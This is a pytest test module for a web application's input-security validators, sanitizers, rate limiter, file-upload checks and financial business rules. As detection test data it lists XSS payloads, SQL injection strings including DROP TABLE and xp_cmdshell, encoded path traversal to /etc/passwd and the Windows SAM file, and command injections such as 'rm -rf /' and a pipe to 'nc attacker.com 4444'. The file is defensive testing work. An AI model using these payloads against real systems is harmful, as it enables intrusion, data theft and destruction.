"""
Comprehensive tests for validation and security features.

This module tests:
- Input validation and sanitization
- Security threat detection (XSS, SQL injection, etc.)
- File upload validation
- Rate limiting
- Business rule validation
- Middleware functionality
"""

import pytest
import tempfile
import os
from datetime import datetime, date, timedelta
from decimal import Decimal
from unittest.mock import Mock, patch

from src.utils.validators import (
    SecurityValidator, InputSanitizer, ValidationResult,
    BusinessRuleValidator, RequestValidator, RateLimitValidator,
    validate_input_security, sanitize_input, sanitize_filename,
    sanitize_path, EnhancedFileValidator
)
from src.utils.validation_middleware import (
    validate_input_fields, validate_file_upload, validate_financial_data,
    rate_limit, require_content_type, sanitize_path_params
)
from src.utils.exceptions import ValidationError


class TestSecurityValidator:
    """Test security validation functionality."""
    
    def test_detect_xss_attacks(self):
        """Test XSS attack detection."""
        # Test cases with XSS attempts
        xss_attempts = [
            '<script>alert("xss")</script>',
            'javascript:alert("xss")',
            '<img src="x" onerror="alert(1)">',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<object data="javascript:alert(1)"></object>',
            '<embed src="javascript:alert(1)">',
            '<link rel="stylesheet" href="javascript:alert(1)">',
            '<style>body{background:url("javascript:alert(1)")}</style>',
            'expression(alert("xss"))',
            'url(javascript:alert(1))',
            '@import "javascript:alert(1)"',
            'vbscript:alert("xss")',
            'data:text/html,<script>alert(1)</script>'
        ]
        
        for xss_attempt in xss_attempts:
            assert SecurityValidator.detect_xss(xss_attempt), f"Failed to detect XSS: {xss_attempt}"
        
        # Test safe inputs
        safe_inputs = [
            'Hello world',
            'user@example.com',
            '123.45',
            'Normal text with numbers 123',
            'Text with special chars: !@#$%^&*()'
        ]
        
        for safe_input in safe_inputs:
            assert not SecurityValidator.detect_xss(safe_input), f"False positive XSS detection: {safe_input}"
    
    def test_detect_sql_injection(self):
        """Test SQL injection detection."""
        # Test cases with SQL injection attempts
        sql_attempts = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1' UNION SELECT * FROM users--",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "1' AND 1=1--",
            "1' OR 1=1#",
            "'; EXEC xp_cmdshell('dir'); --",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' OR SLEEP(5)--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "'; SELECT * FROM information_schema.tables--",
            "1' AND (SELECT COUNT(*) FROM users) > 0--",
            "'; BENCHMARK(5000000,MD5(1))--",
            "1' OR pg_sleep(5)--"
        ]
        
        for sql_attempt in sql_attempts:
            assert SecurityValidator.detect_sql_injection(sql_attempt), f"Failed to detect SQL injection: {sql_attempt}"
        
        # Test safe inputs
        safe_inputs = [
            'Hello world',
            'user@example.com',
            '123.45',
            'Normal text with numbers 123',
            "Text with apostrophe's but safe"
        ]
        
        for safe_input in safe_inputs:
            assert not SecurityValidator.detect_sql_injection(safe_input), f"False positive SQL injection detection: {safe_input}"
    
    def test_detect_path_traversal(self):
        """Test path traversal detection."""
        # Test cases with path traversal attempts
        path_attempts = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32',
            '..%2f..%2f..%2fetc%2fpasswd',
            '..%5c..%5c..%5cwindows%5csystem32',
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '..%c1%9c..%c1%9c..%c1%9cwindows%c1%9csystem32'
        ]
        
        for path_attempt in path_attempts:
            assert SecurityValidator.detect_path_traversal(path_attempt), f"Failed to detect path traversal: {path_attempt}"
        
        # Test safe paths
        safe_paths = [
            'normal/file/path.txt',
            'uploads/document.pdf',
            'images/photo.jpg',
            'data/report.xlsx'
        ]
        
        for safe_path in safe_paths:
            assert not SecurityValidator.detect_path_traversal(safe_path), f"False positive path traversal detection: {safe_path}"
    
    def test_detect_command_injection(self):
        """Test command injection detection."""
        # Test cases with command injection attempts
        command_attempts = [
            'file.txt; rm -rf /',
            'file.txt && cat /etc/passwd',
            'file.txt | nc attacker.com 4444',
            'file.txt `whoami`',
            'file.txt $(id)',
            'file.txt; ls -la',
            'file.txt & dir',
            'input > /dev/null',
            'input >> log.txt',
            'input < /etc/passwd',
            'eval("malicious code")',
            'exec("rm -rf /")',
            'system("format c:")',
            'shell_exec("cat /etc/passwd")',
            'passthru("whoami")',
            'popen("ls -la")'
        ]
        
        for command_attempt in command_attempts:
            assert SecurityValidator.detect_command_injection(command_attempt), f"Failed to detect command injection: {command_attempt}"
        
        # Test safe inputs
        safe_inputs = [
            'normal filename.txt',
            'user@example.com',
            '123.45',
            'Text with normal punctuation!'
        ]
        
        for safe_input in safe_inputs:
            assert not SecurityValidator.detect_command_injection(safe_input), f"False positive command injection detection: {safe_input}"
    
    def test_validate_input_security(self):
        """Test comprehensive input security validation."""
        # Test malicious input
        malicious_input = '<script>alert("xss")</script>; DROP TABLE users; --'
        result = SecurityValidator.validate_input_security(malicious_input, 'test_field')
        
        assert not result.is_valid
        assert len(result.errors) >= 2  # Should detect both XSS and SQL injection
        assert any('XSS' in error for error in result.errors)
        assert any('SQL injection' in error for error in result.errors)
        
        # Test safe input
        safe_input = 'Hello, this is a normal message!'
        result = SecurityValidator.validate_input_security(safe_input, 'test_field')
        
        assert result.is_valid
        assert len(result.errors) == 0


class TestInputSanitizer:
    """Test input sanitization functionality."""
    
    def test_sanitize_html(self):
        """Test HTML sanitization."""
        # Test dangerous HTML
        dangerous_html = '<script>alert("xss")</script><p>Safe content</p>'
        sanitized = InputSanitizer.sanitize_html(dangerous_html)
        
        assert '<script>' not in sanitized
        assert 'alert(' not in sanitized
        assert '&lt;script&gt;' in sanitized or 'Safe content' in sanitized
        
        # Test with allowed tags
        html_with_allowed = '<b>Bold</b> and <script>alert("xss")</script>'
        sanitized = InputSanitizer.sanitize_html(html_with_allowed, ['b'])
        
        assert '<b>Bold</b>' in sanitized
        assert '<script>' not in sanitized
    
    def test_sanitize_sql_input(self):
        """Test SQL input sanitization."""
        # Test SQL injection attempt
        sql_injection = "'; DROP TABLE users; --"
        sanitized = InputSanitizer.sanitize_sql_input(sql_injection)
        
        assert 'DROP TABLE' not in sanitized
        assert '--' not in sanitized
        assert "''" in sanitized  # Single quotes should be escaped
        
        # Test normal input
        normal_input = "John's Company"
        sanitized = InputSanitizer.sanitize_sql_input(normal_input)
        
        assert "John''s Company" == sanitized
    
    def test_sanitize_filename(self):
        """Test filename sanitization."""
        # Test dangerous filename
        dangerous_filename = '../../../etc/passwd<script>.txt'
        sanitized = InputSanitizer.sanitize_filename(dangerous_filename)
        
        assert '../' not in sanitized
        assert '<script>' not in sanitized
        assert sanitized.endswith('.txt')
        
        # Test normal filename
        normal_filename = 'document_2023.pdf'
        sanitized = InputSanitizer.sanitize_filename(normal_filename)
        
        assert sanitized == normal_filename
        
        # Test empty filename
        empty_filename = ''
        sanitized = InputSanitizer.sanitize_filename(empty_filename)
        
        assert sanitized == 'file'
        
        # Test very long filename
        long_filename = 'a' * 300 + '.txt'
        sanitized = InputSanitizer.sanitize_filename(long_filename)
        
        assert len(sanitized) <= 255
        assert sanitized.endswith('.txt')
    
    def test_sanitize_path(self):
        """Test path sanitization."""
        # Test path traversal attempt
        dangerous_path = '../../../etc/passwd'
        sanitized = InputSanitizer.sanitize_path(dangerous_path)
        
        assert '../' not in sanitized
        assert not sanitized.startswith('/')
        
        # Test normal path
        normal_path = 'uploads/documents/file.pdf'
        sanitized = InputSanitizer.sanitize_path(normal_path)
        
        assert sanitized == normal_path
        
        # Test Windows path
        windows_path = 'uploads\\documents\\file.pdf'
        sanitized = InputSanitizer.sanitize_path(windows_path)
        
        assert '\\' not in sanitized
        assert '/' in sanitized
    
    def test_sanitize_general_input(self):
        """Test general input sanitization."""
        # Test with HTML
        html_input = '<p>Hello <script>alert("xss")</script> world</p>'
        sanitized = InputSanitizer.sanitize_general_input(html_input, allow_html=False)
        
        assert '<script>' not in sanitized
        assert '&lt;' in sanitized or '&gt;' in sanitized
        
        # Test with allowed HTML
        html_input = '<b>Bold</b> text'
        sanitized = InputSanitizer.sanitize_general_input(html_input, allow_html=True)
        
        assert '<b>Bold</b>' in sanitized
        
        # Test length limiting
        long_input = 'a' * 2000
        sanitized = InputSanitizer.sanitize_general_input(long_input, max_length=100)
        
        assert len(sanitized) <= 100
    
    def test_sanitize_url(self):
        """Test URL sanitization."""
        # Test dangerous URL
        dangerous_url = 'javascript:alert("xss")'
        sanitized = InputSanitizer.sanitize_url(dangerous_url)
        
        assert not sanitized.startswith('javascript:')
        assert sanitized.startswith('https://')
        
        # Test normal URL
        normal_url = 'https://example.com/path?param=value'
        sanitized = InputSanitizer.sanitize_url(normal_url)
        
        assert sanitized == normal_url
        
        # Test URL without protocol
        url_without_protocol = 'example.com/path'
        sanitized = InputSanitizer.sanitize_url(url_without_protocol)
        
        assert sanitized.startswith('https://')


class TestBusinessRuleValidator:
    """Test business rule validation."""
    
    def test_validate_financial_transaction(self):
        """Test financial transaction validation."""
        # Test valid transaction
        valid_transaction = {
            'amount': 100.50,
            'date': date.today(),
            'description': 'Valid transaction',
            'bank_name': 'itau'
        }
        
        result = BusinessRuleValidator.validate_financial_transaction(valid_transaction)
        assert result.is_valid
        
        # Test transaction with excessive amount
        excessive_transaction = {
            'amount': 1000000000.00,  # Exceeds MAX_TRANSACTION_AMOUNT
            'date': date.today(),
            'description': 'Excessive amount',
            'bank_name': 'itau'
        }
        
        result = BusinessRuleValidator.validate_financial_transaction(excessive_transaction)
        assert not result.is_valid
        assert any('exceeds maximum' in error for error in result.errors)
        
        # Test transaction with future date
        future_transaction = {
            'amount': 100.50,
            'date': date.today() + timedelta(days=60),  # Too far in future
            'description': 'Future transaction',
            'bank_name': 'itau'
        }
        
        result = BusinessRuleValidator.validate_financial_transaction(future_transaction)
        assert not result.is_valid
        assert any('too far in future' in error for error in result.errors)
        
        # Test transaction with suspicious description
        suspicious_transaction = {
            'amount': 100.50,
            'date': date.today(),
            'description': 'test transaction',  # Contains 'test'
            'bank_name': 'itau'
        }
        
        result = BusinessRuleValidator.validate_financial_transaction(suspicious_transaction)
        assert result.is_valid  # Should be valid but with warnings
        assert len(result.warnings) > 0
        assert any('Suspicious description' in warning for warning in result.warnings)
    
    def test_validate_company_financial_entry(self):
        """Test company financial entry validation."""
        # Test valid entry
        valid_entry = {
            'amount': -100.50,  # Negative for expense
            'date': date.today(),
            'description': 'Office supplies',
            'transaction_type': 'expense',
            'category': 'office_supplies'
        }
        
        result = BusinessRuleValidator.validate_company_financial_entry(valid_entry)
        assert result.is_valid
        
        # Test expense with positive amount (should warn)
        positive_expense = {
            'amount': 100.50,  # Positive amount for expense
            'date': date.today(),
            'description': 'Office supplies',
            'transaction_type': 'expense',
            'category': 'office_supplies'
        }
        
        result = BusinessRuleValidator.validate_company_financial_entry(positive_expense)
        assert result.is_valid  # Valid but with warnings
        assert len(result.warnings) > 0
        assert any('positive amount' in warning for warning in result.warnings)
        
        # Test unusually large amount
        large_entry = {
            'amount': 2000000.00,  # Very large amount
            'date': date.today(),
            'description': 'Large purchase',
            'transaction_type': 'expense',
            'category': 'equipment'
        }
        
        result = BusinessRuleValidator.validate_company_financial_entry(large_entry)
        assert result.is_valid  # Valid but with warnings
        assert len(result.warnings) > 0
        assert any('Unusually large amount' in warning for warning in result.warnings)


class TestRateLimitValidator:
    """Test rate limiting functionality."""
    
    def test_rate_limiting(self):
        """Test rate limiting validation."""
        rate_limiter = RateLimitValidator()
        
        # Test normal usage
        for i in range(5):
            result = rate_limiter.validate_rate_limit('test_ip', max_requests=10, window_minutes=60)
            assert result.is_valid
        
        # Test rate limit exceeded
        for i in range(10):
            result = rate_limiter.validate_rate_limit('test_ip2', max_requests=5, window_minutes=60)
        
        # The 6th request should be blocked
        result = rate_limiter.validate_rate_limit('test_ip2', max_requests=5, window_minutes=60)
        assert not result.is_valid
        assert any('Rate limit exceeded' in error for error in result.errors)
        
        # Test IP blocking for excessive violations
        for i in range(15):
            rate_limiter.validate_rate_limit('test_ip3', max_requests=5, window_minutes=60)
        
        # IP should be blocked
        result = rate_limiter.validate_rate_limit('test_ip3', max_requests=5, window_minutes=60)
        assert not result.is_valid
        assert any('temporarily blocked' in error for error in result.errors)
        
        # Test unblocking
        rate_limiter.unblock_ip('test_ip3')
        result = rate_limiter.validate_rate_limit('test_ip3', max_requests=5, window_minutes=60)
        # Should still be rate limited but not blocked
        assert not result.is_valid
        assert not any('temporarily blocked' in error for error in result.errors)


class TestRequestValidator:
    """Test request validation functionality."""
    
    def test_validate_request_size(self):
        """Test request size validation."""
        # Test normal size
        result = RequestValidator.validate_request_size(1024)  # 1KB
        assert result.is_valid
        
        # Test excessive size
        result = RequestValidator.validate_request_size(20 * 1024 * 1024)  # 20MB
        assert not result.is_valid
        assert any('exceeds maximum' in error for error in result.errors)
    
    def test_validate_headers(self):
        """Test header validation."""
        # Test normal headers
        normal_headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'application/json'
        }
        
        result = RequestValidator.validate_headers(normal_headers)
        assert result.is_valid
        
        # Test header injection
        malicious_headers = {
            'X-Custom': 'value\r\nX-Injected: malicious',
            'Content-Type': 'application/json'
        }
        
        result = RequestValidator.validate_headers(malicious_headers)
        assert not result.is_valid
        assert any('Header injection' in error for error in result.errors)
        
        # Test invalid content type
        invalid_headers = {
            'Content-Type': 'application/evil',
            'User-Agent': 'Mozilla/5.0'
        }
        
        result = RequestValidator.validate_headers(invalid_headers)
        assert not result.is_valid
        assert any('Invalid content-type' in error for error in result.errors)
    
    def test_validate_url(self):
        """Test URL validation."""
        # Test normal URL
        normal_url = 'https://example.com/api/endpoint'
        result = RequestValidator.validate_url(normal_url)
        assert result.is_valid
        
        # Test very long URL
        long_url = 'https://example.com/' + 'a' * 3000
        result = RequestValidator.validate_url(long_url)
        assert not result.is_valid
        assert any('exceeds maximum' in error for error in result.errors)
        
        # Test malicious URL
        malicious_url = 'https://example.com/api?param=<script>alert("xss")</script>'
        result = RequestValidator.validate_url(malicious_url)
        assert not result.is_valid
        assert any('Malicious content' in error for error in result.errors)


class TestEnhancedFileValidator:
    """Test enhanced file validation."""
    
    def test_file_validation(self):
        """Test enhanced file validation."""
        # Create a temporary test file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as temp_file:
            temp_file.write('This is a test file content.')
            temp_path = temp_file.name
        
        try:
            validator = EnhancedFileValidator(
                allowed_extensions=['txt'],
                max_size_bytes=1024,
                allowed_mime_types=['text/plain'],
                check_content=False  # Skip content check for this test
            )
            
            result = validator.validate_file(temp_path, 'test.txt')
            assert result.is_valid
            
        finally:
            # Clean up
            if os.path.exists(temp_path):
                os.unlink(temp_path)
    
    def test_malicious_file_detection(self):
        """Test detection of malicious files."""
        # Create a file with script content
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as temp_file:
            temp_file.write('<script>alert("malicious")</script>')
            temp_path = temp_file.name
        
        try:
            validator = EnhancedFileValidator(
                allowed_extensions=['txt'],
                max_size_bytes=1024,
                check_content=True
            )
            
            result = validator.validate_file(temp_path, 'malicious.txt')
            assert not result.is_valid
            assert any('malicious embedded scripts' in error for error in result.errors)
            
        finally:
            # Clean up
            if os.path.exists(temp_path):
                os.unlink(temp_path)


class TestValidationUtilityFunctions:
    """Test validation utility functions."""
    
    def test_validate_input_security_function(self):
        """Test validate_input_security utility function."""
        # Test malicious input
        result = validate_input_security('<script>alert("xss")</script>', 'test_field')
        assert not result.is_valid
        assert len(result.errors) > 0
        
        # Test safe input
        result = validate_input_security('Hello world', 'test_field')
        assert result.is_valid
        assert len(result.errors) == 0
    
    def test_sanitize_input_function(self):
        """Test sanitize_input utility function."""
        # Test HTML input
        html_input = '<p>Hello <script>alert("xss")</script> world</p>'
        sanitized = sanitize_input(html_input)
        
        assert '<script>' not in sanitized
        assert 'Hello' in sanitized
        assert 'world' in sanitized
    
    def test_sanitize_filename_function(self):
        """Test sanitize_filename utility function."""
        dangerous_filename = '../../../etc/passwd<script>.txt'
        sanitized = sanitize_filename(dangerous_filename)
        
        assert '../' not in sanitized
        assert '<script>' not in sanitized
        assert sanitized.endswith('.txt')
    
    def test_sanitize_path_function(self):
        """Test sanitize_path utility function."""
        dangerous_path = '../../../etc/passwd'
        sanitized = sanitize_path(dangerous_path)
        
        assert '../' not in sanitized
        assert not sanitized.startswith('/')


if __name__ == '__main__':
    pytest.main([__file__])